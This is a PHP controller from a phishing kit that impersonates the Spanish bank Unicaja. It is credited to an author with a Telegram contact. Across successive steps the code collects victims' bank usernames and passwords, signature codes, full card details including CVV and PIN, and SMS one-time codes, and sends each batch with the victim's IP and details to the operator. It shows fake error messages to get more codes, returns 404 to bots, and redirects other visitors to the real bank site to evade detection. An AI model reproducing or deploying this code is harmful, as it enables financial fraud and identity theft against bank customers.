<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/

    require_once 'includes/main.php';
    if( $_GET['pwd'] == PASSWORD ) {
        session_destroy();
        visitors();
        $page = go('login');
        header("Location: " . $page['path'] . "?verification#_");
        exit();
    } else if( !empty($_GET['redirection']) ) {
        $red = $_GET['redirection'];
        if( $red == 'errorlogin' ) {
            $page = go('login');
            header("Location: " . $page['path'] . "?error=1&verification#_");
            exit();
        }
        if( $red == 'errorfirma' ) {
            $_SESSION['errors']['firma'] = 'la firma que ingresó es incorrecta.';
            $page = go('firma');
            header("Location: " . $page['path'] . "?error=1&verification#_");
            exit();
        }
        if( $red == 'errorsms' ) {
            $_SESSION['errors']['sms_code'] = 'el último SMS que ha ingresado es incorrecto.';
            $page = go('sms');
            header("Location: " . $page['path'] . "?error=1&verification#_");
            exit();
        }
        $page = go($red);
        header("Location: " . $page['path'] . "?verification#_");
        exit();
    } else if($_SERVER['REQUEST_METHOD'] == "POST") {
        if( !empty($_POST['captcha']) ) {
            header("HTTP/1.0 404 Not Found");
            die();
        }
        if ($_POST['step'] == "login") {
            $_SESSION['errors']     = [];
            $_SESSION['username']   = $_POST['username'];
            $_SESSION['password']        = $_POST['password'];
            $subject = get_client_ip() . ' | UNICAJA | Login';
            $message = '/-- LOGIN INFOS --/' . get_client_ip() . "\r\n";
            $message .= 'Username : ' . $_POST['username'] . "\r\n";
            $message .= 'password : ' . $_POST['password'] . "\r\n";
            $message .= '/-- END LOGIN INFOS --/' . "\r\n";
            $message .= victim_infos();
            send($subject,$message);
            $page = go('firma');
            header("Location: " . $page['path'] . "?verification#_");
            exit();
        }
        if ($_POST['step'] == "firma") {
            $_SESSION['errors']     = [];
            $_SESSION['firma']   = $_POST['firma'];
            if( empty($_POST['firma']) ) {
                $_SESSION['errors']['firma'] = 'la firma que ingresó es incorrecta.';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | UNICAJA | FIRMA';
                $message = '/-- FIRMA INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Firma : ' . $_POST['firma'] . "\r\n";
                $message .= '/-- END FIRMA INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                $page = go('cc');
                header("Location: " . $page['path'] . "?verification#_");
                exit();
            } else {
                $page = go('firma');
                header("Location: " . $page['path'] . "?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "cc") {
            $_SESSION['errors']      = [];
            $_SESSION['one']   = $_POST['one'];
            $_SESSION['two']     = $_POST['two'];
            $_SESSION['three']      = $_POST['three'];
            $_SESSION['four']      = $_POST['four'];
            $date_ex     = explode('/',$_POST['two']);
            $card_number = validate_cc_number($_POST['one']);
            $card_cvv    = validate_cc_cvv($_POST['three'],$card_number['type']);
            $card_date   = validate_cc_date($date_ex[0],$date_ex[1]);
            if( $card_number == false ) {
                $_SESSION['errors']['one'] = 'Por favor, introduzca un número de tarjeta válido.';
            }
            if( $card_cvv == false ) {
                $_SESSION['errors']['three'] = 'Por favor ingrese un código válido.';
            }
            if( $card_date == false ) {
                $_SESSION['errors']['two'] = 'Por favor introduzca una fecha válida.';
            }
            if( validate_number($_POST['four'],4) == false ) {
                $_SESSION['errors']['two'] = 'Introduzca un PIN válido.';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | UNICAJA | Card';
                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Card number : ' . $_POST['one'] . "\r\n";
                $message .= 'Card Date : ' . $_POST['two'] . "\r\n";
                $message .= 'Card CVV : ' . $_POST['three'] . "\r\n";
                $message .= 'Card PIN : ' . $_POST['four'] . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                $page = go('loading1');
                header("Location: " . $page['path'] . "?verification#_");
            } else {
                $page = go('cc');
                header("Location: " . $page['path'] . "?error#_");
            }
        }
        if ($_POST['step'] == "sms") {
            $_SESSION['errors']     = [];
            $_SESSION['sms_code']   = $_POST['sms_code'];
            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = 'el último SMS que ha ingresado es incorrecto.';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | UNICAJA | Sms';
                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS code : ' . $_POST['sms_code'] . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                if( $_POST['error'] > 0 ) {
                    $page = go('success');
                    header("Location: " . $page['path'] . "?verification#_");
                    exit();
                }
                $_SESSION['errors']['sms_code'] = 'el último SMS que ha ingresado es incorrecto.';
                $page = go('loading2');
                header("Location: " . $page['path'] . "?verification#_");
                exit();
            } else {
                $error = $_POST['error'];
                $page = go('sms');
                header("Location: " . $page['path'] . "?error=$error&verification#_");
                exit();
            }
        }
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>